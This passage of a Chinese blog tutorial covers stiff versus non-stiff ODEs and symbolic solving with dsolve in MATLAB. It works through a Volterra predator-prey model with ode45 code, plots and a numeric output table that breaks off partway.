class="headerlink" title="刚性常微分方程"></a>刚性常微分方程</h1><h2 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h2><p>所谓刚性方程，就是说存在两(多)重尺度，一个尺度比另外一个尺度大很多。所导致的麻烦就是在计算中很难兼顾两者。例如下面的方程：dx=-100x-100.1ydy=100.1x-100y 两个特征值 lambda_1 = -200.1，lambda_2 = -0.1 所以解表现为 a1_exp(-200.1_X) + a2_exp(-0.1_X)，无论你用什么样的尺度(单一尺度)都不能很好刻画解的行为。一个是快变行为，一个是慢变行为。 所有这样的方程计算时候，稳定性条件比较苛刻。实际情况要比这还复杂得多。<br>对于刚性和非刚性微分方程的区分，可以简单的转变为在将原方程转换为常微分方程组后，进行一个简单的系数判断：<br>例如：</p><p>$$<br>y’’’ - 3y’’ - y’y = 0, y(0) = 0, y’(0) = 0, y’’(0) = -1;<br>$$</p><p>在这里可以设  y1 = y, y2 = y’, y3 = y’’, 有</p><p>$$<br>  y_1’ = y_2,      　y_1(0) = 0,<br>$$</p><p>$$<br>  y_2’ = y_3,       y_2(0) = 1,<br>$$</p><p>$$<br>  y_3’ = 3y_3 + y_2y_1,   y_3(0) = -1,<br>$$</p><p>这里可以简单判断出方程组的右侧系数矩阵值差异不大，得到的特征值差异随之也不大，可以简单判断为非刚性微分方程。<br>MATLAB 中<strong>解非刚性微分方程常用 ode45 ;</strong></p><p>又例如：<br><img src="https://image.hackerjerry.top/Differential-Equations-6.svg#card=math&code=y%27%27%20-%201000%281%20-%20y%5E2%29y%27%20%2B%20y%20%3D%200%2C%20y%280%29%20%3D%202%2C%20y%27%280%29%20%3D%200%3B&height=23&width=348"></p><p>在这里可以设<img src="https://cdn.nlark.com/yuque/__latex/0feecf5b95ff7b36da6886a607fb0ec6.svg#card=math&code=y1%20%3D%20y%2C%20y2%20%3D%20y%27&height=20&width=107">, 有</p><p><img src="https://image.hackerjerry.top/Differential-Equations-7.svg#card=math&code=y1%27%20%3D%20y2%2C%20%20%20%20%20%20%20%20%20%20%20y1%280%29%20%3D%202%2C&height=21&width=142"></p><p><img src="https://image.hackerjerry.top/Differential-Equations-8.svg#card=math&code=y2%27%20%3D%201000%281%20-%20y1%5E2%29y2%20-%20y1%2C%20%20y2%280%29%20%3D%200%2C&height=23&width=280"></p><p>这里可以简单判断出方程组的右侧系数矩阵值差异较大，得到的特征值差异随之较大，可以简单判断为刚性微分方程。<br>MATLAB 中<strong>解刚性微分方程常用 ode15s , ode23s , ode23t , ode23tb ;</strong></p><blockquote><p>如果区分不出来就多试试.</p></blockquote><p><img src="https://image.hackerjerry.top/Differential-Equations-9.png#align=left&display=inline&height=362&margin=%5Bobject%20Object%5D&originHeight=362&originWidth=704&size=0&status=done&style=none&width=704"></p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs matlab">dy=@(t,y)[y(<span class="hljs-number">2</span>);y(<span class="hljs-number">3</span>);<span class="hljs-number">3</span>*y(<span class="hljs-number">3</span>)+y(<span class="hljs-number">2</span>)*y(<span class="hljs-number">1</span>)];<br>[T,Y]=ode23s(@(t,y)dy(t,y),[<span class="hljs-number">0</span> <span class="hljs-number">1</span>],[<span class="hljs-number">0</span>;<span class="hljs-number">1</span>;<span class="hljs-number">-1</span>]);<span class="hljs-comment">%函数传参一定要声明句柄,参数前后都要写</span><br></code></pre></td></tr></table></figure><h1 id="解常微分方程符号解"><a href="#解常微分方程符号解" class="headerlink" title="解常微分方程符号解"></a>解常微分方程符号解</h1><p>常微分方程在 Matlab 中按如下规定重新表达： 符号 D 表示对变量的求导。Dy 表示对变量 y 求一阶导数，当需要求变量的 n 阶导 数时，用 Dn 表示，D4y 表示对变量 y 求 4 阶导数。由此，常微分方程 $y’’+2y’= y$ 在 Matlab 中，将写成<br><img src="https://image.hackerjerry.top/Differential-Equations-10.svg#card=math&code=D2y%2B2%2ADy%3Dy&height=18&width=128"></p><h2 id="求解常微分方程的通解"><a href="#求解常微分方程的通解" class="headerlink" title="求解常微分方程的通解"></a>求解常微分方程的通解</h2><p>无初边值条件的常微分方程的解就是该方程的通解。<br><code>dsolve(&#39; diff_equation&#39;，&#39;var&#39;)</code><br>式中 diff_equation 为待解的常微分方程，第 1 种格式将以变量 t 为自变量进行求解， 第 2 种格式则需定义自变量 var。<br>栗子:<br>解<img src="https://cdn.nlark.com/yuque/__latex/80ea40cf4ace3937d7e295680fe5eac1.svg#card=math&code=x%5E2%2By%2B%28x-2y%29y%27%3D0&height=23&width=171"><br>程序如下:</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs matlab">syms x y<br>diff_equ=<span class="hljs-string">&#x27;x^2+y+(x-2*y)*Dy=0&#x27;</span>;<span class="hljs-comment">%字符串形式的变量!注意!</span><br>dsolve(diff_equ,<span class="hljs-string">&#x27;x&#x27;</span>)<br><span class="hljs-comment">%ans =</span><br><span class="hljs-comment">% x/2 + ((4*x^3)/3 + x^2 + C4)^(1/2)/2</span><br><span class="hljs-comment">% x/2 - ((4*x^3)/3 + x^2 + C4)^(1/2)/2</span><br></code></pre></td></tr></table></figure><h2 id="求解常微分方程的初边值问题"><a href="#求解常微分方程的初边值问题" class="headerlink" title="求解常微分方程的初边值问题"></a>求解常微分方程的初边值问题</h2><p><code>dsolve(&#39;diff_equation&#39;，&#39;condition1，condition2，…&#39;，&#39;var&#39;)</code>其中 condition1，condition2，… 即为微分方程的初边值条件。<br>例如<code>y=dsolve(&#39;D3y-D2y=x&#39;,&#39;y(1)=8,Dy(1)=7,D2y(2)=4&#39;,&#39;x&#39;)</code><br>结果为</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs matlab">y =<br>x*((<span class="hljs-built_in">exp</span>(<span class="hljs-number">-1</span>)*(<span class="hljs-number">19</span>*<span class="hljs-built_in">exp</span>(<span class="hljs-number">1</span>) - <span class="hljs-number">14</span>))/<span class="hljs-number">2</span> - <span class="hljs-number">1</span>) + <span class="hljs-number">7</span>*<span class="hljs-built_in">exp</span>(<span class="hljs-number">-2</span>)*<span class="hljs-built_in">exp</span>(x) - x^<span class="hljs-number">2</span>/<span class="hljs-number">2</span> - x^<span class="hljs-number">3</span>/<span class="hljs-number">6</span> + (<span class="hljs-built_in">exp</span>(<span class="hljs-number">-1</span>)*(<span class="hljs-number">19</span>*<span class="hljs-built_in">exp</span>(<span class="hljs-number">1</span>) - <span class="hljs-number">14</span>))/<span class="hljs-number">2</span> - (<span class="hljs-built_in">exp</span>(<span class="hljs-number">-1</span>)*(<span class="hljs-number">25</span>*<span class="hljs-built_in">exp</span>(<span class="hljs-number">1</span>) - <span class="hljs-number">21</span>))/<span class="hljs-number">3</span> - <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h2 id="求解常微分方程组"><a href="#求解常微分方程组" class="headerlink" title="求解常微分方程组"></a>求解常微分方程组</h2><p><code> ``dsolve``(``&#39;diff_equ1，diff_equ2，…&#39;``，``&#39;``var``&#39;``)``%用于求通解</code><br><code> ``dsolve``(``&#39;diff_equ1，diff_equ2，…&#39;``，``&#39;``condition1，condition2，…``&#39;``，``&#39;``var``&#39;``)``%用于求初始值</code><br>例如,求<br><img src="https://image.hackerjerry.top/Differential-Equations-11.svg#card=math&code=%5Cleft%5C%7B%0A%20%20%20%20%5Cbegin%7Barray%7D%7Brcl%7D%0A%20%20%20%20f%27%27%2B3g%3Dsinx%5C%5C%0A%20%20%20%20f%27%2Bg%27%3Dcosx%0A%20%20%20%20%20%20%20%0A%20%20%20%20%5Cend%7Barray%7D%0A%20%20%20%0A%5Cright.&height=45&width=128"></p><p>这个方程组的通解和在初始值为的解.</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs matlab">equ1=<span class="hljs-string">&#x27;D2f+3*g=sin(x)&#x27;</span>;<br>equ2=<span class="hljs-string">&#x27;Dg+Df=cos(x)&#x27;</span>;<br>[general_f,general_g]=dsolve(equ1,equ2,<span class="hljs-string">&#x27;x&#x27;</span>)<br>[f,g]=dsolve(equ1,equ2,<span class="hljs-string">&#x27;Df(2)=0,f(3)=3,g(5)=1&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<br></code></pre></td></tr></table></figure><p>目前没有覆盖到多变量的常微分方程数值解,也不知道 ode45 传初始值的矩阵究竟用列向量还是行向量(似乎都可以,无论逗号或是分号)</p><h1 id="实战学习"><a href="#实战学习" class="headerlink" title="实战学习"></a>实战学习</h1><h2 id="双变量初始值下的常微分方程组"><a href="#双变量初始值下的常微分方程组" class="headerlink" title="双变量初始值下的常微分方程组"></a>双变量初始值下的常微分方程组</h2><h3 id="伏尔泰拉-Volterra-弱肉强食模型"><a href="#伏尔泰拉-Volterra-弱肉强食模型" class="headerlink" title="伏尔泰拉(Volterra)弱肉强食模型"></a>伏尔泰拉(Volterra)弱肉强食模型</h3><h4 id="问题提出"><a href="#问题提出" class="headerlink" title="问题提出"></a>问题提出</h4><p><img src="https://image.hackerjerry.top/Differential-Equations-12.png#align=left&display=inline&height=551&margin=%5Bobject%20Object%5D&originHeight=551&originWidth=1210&size=0&status=done&style=none&width=1210"></p><h4 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h4><p>即初值问题</p><p>其中,</p><ul><li><p>r 是食饵独立生存的时候自然增长率</p></li><li><p>a 是由于捕食者存在导致减少的比例系数</p></li><li><p>c 是捕食者独自存在时候的死亡率</p></li><li><p>b 是由于食饵存在导致死亡率减少的比例系数</p></li></ul><blockquote><p>它们均大于 0.</p></blockquote><p>注意多变量的矩阵变换<br>或许必须将 x’,y’放在方程组的一边用于迭代<br><img src="https://image.hackerjerry.top/Differential-Equations-13.png#align=left&display=inline&height=1000&margin=%5Bobject%20Object%5D&originHeight=1000&originWidth=1743&size=0&status=done&style=none&width=1743"><br>但是如果 x’与 y’是乘的关系呢?<br>似乎不用考虑,因为高数里面也没有涉及到<br>函数文件</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dd</span> = <span class="hljs-title">shier</span><span class="hljs-params">(t,x)</span></span><br>r = <span class="hljs-number">1</span>;<br>c =<span class="hljs-number">0.5</span>;<br>a = <span class="hljs-number">0.1</span>;<br>b = <span class="hljs-number">0.02</span>;<br>dd = <span class="hljs-built_in">diag</span>([r-a*x(<span class="hljs-number">2</span>,:),-c+b*x(<span class="hljs-number">1</span>,:)])*x;<span class="hljs-comment">%把原来的x,y放在一个矩阵里就可以只用一个符号变量进行索引</span><br><span class="hljs-comment">%对于左边是x&#x27;的,就把x初始值乘进去,然后索引y的初始值,其实如果反过来索引也可以</span><br>dd返回的是[x&#x27;,y&#x27;]&#x27;,然后交给ode45处理<br></code></pre></td></tr></table></figure><p>调用文件</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs matlab">tspan = <span class="hljs-number">0</span>:<span class="hljs-number">0.1</span>:<span class="hljs-number">15</span>;<br>[t,x] = ode45(@shier,tspan,[<span class="hljs-number">25</span>;<span class="hljs-number">2</span>]);<span class="hljs-comment">%我认为t只是传进来迭代次数,与常微分方程组本身并无关系</span><br><span class="hljs-built_in">plot</span>(t,x);<br></code></pre></td></tr></table></figure><p>结果<br><img src="https://image.hackerjerry.top/Differential-Equations-14.png#align=left&display=inline&height=484&margin=%5Bobject%20Object%5D&originHeight=484&originWidth=631&size=0&status=done&style=none&width=631"><br>这里甚至可以看出图像具有周期性,那么怎么计算出周期呢?</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs matlab">tspan = <span class="hljs-number">0</span>:<span class="hljs-number">0.1</span>:<span class="hljs-number">15</span>;<br>[t,x] = ode45(@shier,tspan,[<span class="hljs-number">25</span>;<span class="hljs-number">2</span>]);<span class="hljs-comment">%我认为t只是传进来迭代次数,与常微分方程组本身并无关系</span><br><span class="hljs-comment">%方法一</span><br><span class="hljs-comment">%a = find((abs(x(1,1)-x(1:length(x),1)))&lt;1);%如果是min的话他只会索引到第一个原值</span><br>这里<br><span class="hljs-comment">%方法二</span><br>a = <span class="hljs-built_in">find</span>(x(:,<span class="hljs-number">1</span>)==(x(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)-<span class="hljs-built_in">min</span>(<span class="hljs-built_in">abs</span>((x(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)-x(<span class="hljs-number">2</span>:<span class="hljs-built_in">length</span>(x),<span class="hljs-number">1</span>))))));<span class="hljs-comment">%这里不是加就是减,一定会索引到最小值的,多试两遍就出来了</span><br><br><span class="hljs-built_in">figure</span>(<span class="hljs-number">1</span>)<br><span class="hljs-comment">%plot(t,x,t(a(2,1),1),x(a(2,1),1),&#x27;*&#x27;);%方法一对应的找数据点方法</span><br><span class="hljs-built_in">plot</span>(t,x,t(a,<span class="hljs-number">1</span>),x(a,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;*&#x27;</span>);<span class="hljs-comment">%方法二对应的找数据点的方法</span><br><span class="hljs-built_in">hold</span> on;<br>line([<span class="hljs-number">0</span> <span class="hljs-number">15</span>],[x(a,<span class="hljs-number">1</span>) x(a,<span class="hljs-number">1</span>)],<span class="hljs-string">&#x27;LineStyle&#x27;</span>,<span class="hljs-string">&#x27;--&#x27;</span>);<span class="hljs-comment">%画一条水平线</span><br>line([t(a,<span class="hljs-number">1</span>) t(a,<span class="hljs-number">1</span>)],[<span class="hljs-number">0</span> x(a,<span class="hljs-number">1</span>)],<span class="hljs-string">&#x27;LineStyle&#x27;</span>,<span class="hljs-string">&#x27;--&#x27;</span>);<span class="hljs-comment">%画一条竖直线</span><br><span class="hljs-built_in">figure</span>(<span class="hljs-number">2</span>);<br><span class="hljs-built_in">plot</span>(x(:,<span class="hljs-number">1</span>),x(:,<span class="hljs-number">2</span>))<br></code></pre></td></tr></table></figure><p>效果图<br><img src="https://image.hackerjerry.top/Differential-Equations-15.png#align=left&display=inline&height=478&margin=%5Bobject%20Object%5D&originHeight=478&originWidth=627&size=0&status=done&style=none&width=627"><br><img src="https://image.hackerjerry.top/Differential-Equations-16.png#align=left&display=inline&height=481&margin=%5Bobject%20Object%5D&originHeight=481&originWidth=610&size=0&status=done&style=none&width=610"><br>其中 dd 参数在传入初始值[25;2]后运算结果(即 t=0.1 时)</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-built_in">ans</span> =<br><br> <span class="hljs-number">25</span>*r - <span class="hljs-number">25</span>*a*y<br> <span class="hljs-number">2</span>*b*x - <span class="hljs-number">2</span>*c<br> <span class="hljs-comment">%这是一个列向量,有两行,其中y为2,x为25,这里只是为了便于理解</span><br></code></pre></td></tr></table></figure><pre><code>  而结果最终返回的x是一个n*2的矩阵,第一列是x,第二列是y</code></pre><p>结果的数值表示为</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-built_in">ans</span> =<br><br>                   <span class="hljs-number">0</span>  <span class="hljs-number">25.000000000000000</span>   <span class="hljs-number">2.000000000000000</span><br>   <span class="hljs-number">0.100000000000000</span>  <span class="hljs-number">27.081808053754724</span>   <span class="hljs-number">2.004112695948303</span><br>   <span class="hljs-number">0.200000000000000</span>  <span class="hljs-number">29.334409623386446</span>   <span class="hljs-number">2.016970388233990</span><br>   <span class="hljs-number">0.300000000000000</span>  <span class="hljs-number">31.768915238930827</span>   <span class="hljs-number">2.039429632085728</span><br>   <span class="hljs-number">0.400000000000000</span>  <span class="hljs-number">34.396069793378309</span>   <span class="hljs-number">2.072575255691516</span><br>   <span class="hljs-number">0.500000000000000</span>  <span class="hljs-number">37.225819482896881</span>   <span class="hljs-number">2.117788767225540</span><br>   <span class="hljs-number">0.600000000000000</span>  <span class="hljs-number">40.267311806832083</span>   <span class="hljs-number">2.176748354848179</span><br>   <span class="hljs-number">0.700000000000000</span>  <span class="hljs-number">43.501170756497132</span>   <span class="hljs-number">2.253434244955612</span><br>   <span class="hljs-number">0.800000000000000</span>  <span class="hljs-number">46.935996455891825</span>   <span class="hljs-number">2.350284334323296</span><br>   <span class="hljs-number">0.900000000000000</span>  <span class="hljs-number">50.607214111441841</span>   <span class="hljs-number">2.468336939929975</span><br>   <span class="hljs-number">1.000000000000000</span>  <span class="hljs-number">54.530132303795753</span>   <span class="hljs-number">2.610565196434151</span><br>   <span class="hljs-number">1.100000000000000</span>  <span class="hljs-number">58.699942987824969</span>   <span class="hljs-number">2.781877056174068</span><br>   <span class="hljs-number">1.200000000000000</span>  <span class="hljs-number">63.091721492623776</span>   <span class="hljs-number">2.989115289167727</span><br>   <span class="hljs-number">1.300000000000000</span>  <span class="hljs-number">67.660426521509294</span>   <span class="hljs-number">3.241057483112876</span><br>   <span class="hljs-number">1.400000000000000</span>  <span class="hljs-number">72.340900152021618</span>   <span class="hljs-number">3.548416043387018</span><br>   <span class="hljs-number">1.500000000000000</span>  <span class="hljs-number">77.047867835923512</span>   <span class="hljs-number">3.923838193047399</span><br>   <span class="hljs-number">1.600000000000000</span>  <span class="hljs-number">81.675938399200817</span>   <span class="hljs-number">4.381905972831026</span><br>   <span class="hljs-number">1.700000000000000</span>  <span class="hljs-number">86.099604042062211</span>   <span class="hljs-number">4.939136241154664</span><br>   <span class="hljs-number">1.800000000000000</span>  <span class="hljs-number">90.173240338938967</span>   <span class="hljs-number">5.613980674114787</span><br>   <span class="hljs-number">1.900000000000000</span>  <span class="hljs-number">93.731106238485580</span>   <span class="hljs-number">6.426825765487674</span><br>   <span class="hljs-number">2.000000000000000</span>  <span class="hljs-number">96.587344063579224</span>   <span class="hljs-number">7.399992826729324</span><br>   <span class="hljs-number">2.100000000000000</span>  <span class="hljs-number">98.535979511319994</span>   <span class="hljs-number">8.557737986975489</span><br>   <span class="hljs-number">2.200000000000000</span>  <span class="hljs-number">99.305464073021838</span>   <span class="hljs-number">9.923384989608529</span><br>   <span class="hljs-number">2.300000000000000</span>  <span class="hljs-number">98.614325538390403</span>  <span class="hljs-number">11.508508167056767</span><br>   <span class="hljs-number">2.400000000000000</span>  <span class="hljs-number">96.285088095021379</span>  <span class="hljs-number">13.306709884287148</span><br>   <span class="hljs-number">2.500000000000000</span>  <span class="hljs-number">92.247162361659704</span>  <span class="hljs-number">15.288207079976694</span><br>   <span class="hljs-number">2.600000000000000</span>  <span class="hljs-number">86.585268003842529</span>  <span class="hljs-number">17.394730789385640</span><br>   <span class="hljs-number">2.700000000000000</span>  <span class="hljs-number">79.534876888241484</span>  <span class="hljs-number">19.542682224883006</span><br>   <span class="hljs-number">2.800000000000000</span>  <span class="hljs-number">71.536355306602971</span>  <span class="hljs-number">21.622546215392298</span><br>   <span class="hljs-number">2.900000000000000</span>  <span class="hljs-number">63.084804160958107</span>  <span class="hljs-number">23.530018889724300</span><br>   <span class="hljs-number">3.000000000000000</span>  <span class="hljs-number">54.623560359426598</span>  <span class="hljs-number">25.181931216068016</span><br>   <span class="hljs-number">3.100000000000000</span>  <span class="hljs-number">46.544096804423660</span>  <span class="hljs-number">26.516262459375845</span><br>   <span class="hljs-number">3.200000000000000</span>  <span class="hljs-number">39.186022392660291</span>  <span class="hljs-number">27.492140181363510</span><br>   <span class="hljs-number">3.300000000000000</span>  <span class="hljs-number">32.793221206846198</span>  <span class="hljs-number">28.097843791494348</span><br>   <span class="hljs-number">3.400000000000000</span>  <span class="hljs-number">27.336823355775415</span>  <span class="hljs-number">28.376560995050070</span><br>   <span class="hljs-number">3.500000000000000</span>  <span class="hljs-number">22.737483650943837</span>  <span class="hljs-number">28.376423948829007</span><br>   <span class="hljs-number">3.600000000000000</span>  <span class="hljs-number">18.913395131038023</span>  <span class="hljs-number">28.142567798641700</span><br>   <span class="hljs-number">3.700000000000000</span>  <span class="hljs-number">15.777073834688206</span>  <span class="hljs-number">27.717805173699979</span><br>   <span class="hljs-number">3.800000000000000</span>  <span class="hljs-number">13.235358800468109</span>  <span class="hljs-number">27.142626186616940</span><br>   <span class="hljs-number">3.900000000000000</span>  <span class="hljs-number">11.187311576411814</span>  <span class="hljs-number">26.455624312391883</span><br>   <span class="hljs-number">4.000000000000000</span>   <span class="hljs-number">9.527792494902240</span>  <span class="hljs-number">25.691072088430193</span><br>   <span class="hljs-number">4.100000000000001</span>   <span class="hljs-number">8.175847419742645</span>  <span class="hljs-number">24.874012401250678</span><br>   <span class="hljs-number">4.200000000000000</span>   <span class="hljs-number">7.068391701914113</span>  <span class="hljs-number">24.024511571721689</span><br>   <span class="hljs-number">4.300000000000000</span>   <span class="hljs-number">6.159197028246341</span>  <span class="hljs-number">23.157992057962328</span><br>   <span class="hljs-number">4.400000000000000</span>   <span class="hljs-number">5.418516351184799</span>  <span class="hljs-number">22.285300010011660</span><br>   <span class="hljs-number">4.500000000000000</span>   <span class="hljs-number">4.812949938211244</span>  <span class="hljs-number">21.416178920107392</span><br>   <span class="hljs-number">4.600000000000001</span>   <span class="hljs-number">4.312378013540997</span>  <span class="hljs-number">20.558183397698095</span><br>   <span class="hljs-number">4.700000000000000</span>   <span class="hljs-number">3.896728033888424</span>  <span class="hljs-number">19.716433768708011</span><br>   <span class="hljs-number">4.800000000000001</span>   <span class="hljs-number">3.549963138651240</span>  <span class="hljs-number">18.894836312980246</span><br>   <span class="hljs-number">4.900000000000000</span>   <span class="hljs-number">3.260082149910534</span>  <span class="hljs-number">18.096083264276789</span><br>   <span class="hljs-number">5.000000000000000</span>   <span class="hljs-number">3.018079494247696</span>  <span class="hljs-number">17.321894302742177</span><br>   <span class="hljs-number">5.100000000000001</span>   <span class="hljs-number">2.815390957478957</span>  <span class="hljs-number">16.573545734604863</span><br>   <span class="hljs-number">5.200000000000000</span>   <span class="hljs-number">2.645975745866385</span>  <span class="hljs-number">15.851549329681150</span><br>   <span class="hljs-number">5.300000000000001</span>   <span class="hljs-number">2.504682806034744</span>  <span class="hljs-number">15.156183855662157</span><br>   <span class="hljs-number">5.400000000000000</span>   <span class="hljs-number">2.387154825623396</span>  <span class="hljs-number">14.487520111000972</span><br>   <span class="hljs-number">5.500000000000000</span>   <span class="hljs-number">2.289828233286297</span>  <span class="hljs-number">13.845420924912609</span><br>   <span class="hljs-number">5.600000000000001</span>   <span class="hljs-number">2.209933198691999</span>  <span class="hljs-number">13.229541157374021</span><br>   <span class="hljs-number">5.700000000000000</span>   <span class="hljs-number">2.145493632523649</span>  <span class="hljs-number">12.639327699124115</span><br>   <span class="hljs-number">5.800000000000001</span>   <span class="hljs-number">2.095302528876663</span>  <span class="hljs-number">12.074025260038512</span><br>   <span class="hljs-number">5.900000000000000</span>   <span class="hljs-number">2.057819970371494</span>  <span class="hljs-number">11.532952029583695</span><br>   <span class="hljs-number">6.000000000000000</span>   <span class="hljs-number">2.031734456202639</span>  <span class="hljs-number">11.015418711177421</span><br>   <span class="hljs-number">6.100000000000001</span>   <span class="hljs-number">2.016223775353870</span>  <span class="hljs-number">10.520656535937128</span><br>   <span class="hljs-number">6.200000000000000</span>   <span class="hljs-number">2.010602361556739</span>  <span class="hljs-number">10.047895063292874</span><br>   <span class="hljs-number">6.300000000000001</span>   <span class="hljs-number">2.014321293290578</span>   <span class="hljs-number">9.596362180987299</span><br>   <span class="hljs-number">6.400000000000000</span>   <span class="hljs-number">2.026968293782502</span>   <span class="hljs-number">9.165284105075676</span><br>   <span class="hljs-number">6.500000000000000</span>   <span class="hljs-number">2.048267731007400</span>   <span class="hljs-number">8.753885379925855</span><br>   <span class="hljs-number">6.600000000000001</span>   <span class="hljs-number">2.078080617687949</span>   <span class="hljs-number">8.361388878218298</span><br>   <span class="hljs-number">6.700000000000000</span>   <span class="hljs-number">2.116388457892334</span>   <span class="hljs-number">7.987017842929896</span><br>   <span class="hljs-number">6.800000000000001</span>   <span class="hljs-number">2.163225001305634</span>   <span class="hljs-number">7.630030231078177</span><br>   <span class="hljs-number">6.900000000000000</span>   <span class="hljs-number">2.218783549199125</span>   <span class="hljs-number">7.289725741835887</span><br>   <span class="hljs-number">7.000000000000000</span>   <span class="hljs-number">2.283347851980680</span>   <span class="hljs-number">6.965426060221426</span><br>   <span class="hljs-number">7.100000000000001</span>   <span class="hljs-number">2.357279290720927</span>   <span class="hljs-number">6.656474302505986</span><br>   <span class="hljs-number">7.200000000000000</span>   <span class="hljs-number">2.441016877153240</span>   <span class="hljs-number">6.362235016213561</span><br>   <span class="hljs-number">7.300000000000001</span>   <span class="hljs-number">2.535077253673752</span>   <span class="hljs-number">6.082094180120929</span><br>   <span class="hljs-number">7.400000000000000</span>   <span class="hljs-number">2.640054693341341</span>   <span class="hljs-number">5.815459204257671</span><br>   <span class="hljs-number">7.500000000000000</span>   <span class="hljs-number">2.756621099877643</span>   <span class="hljs-number">5.561758929906152</span><br>   <span class="hljs-number">7.600000000000000</span>   <span class="hljs-number">2.885526007667043</span>   <span class="hljs-number">5.320443629601537</span><br>   <span class="hljs-number">7.699999999999999</span>   <span class="hljs-number">3.027596581756677</span>   <span class="hljs-number">5.090985007131783</span><br>   <span class="hljs-number">7.800000000000000</span>   <span class="hljs-number">3.183737617856438</span>   <span class="hljs-number">4.872876197537634</span><br>   <span class="hljs-number">7.899999999999999</span>   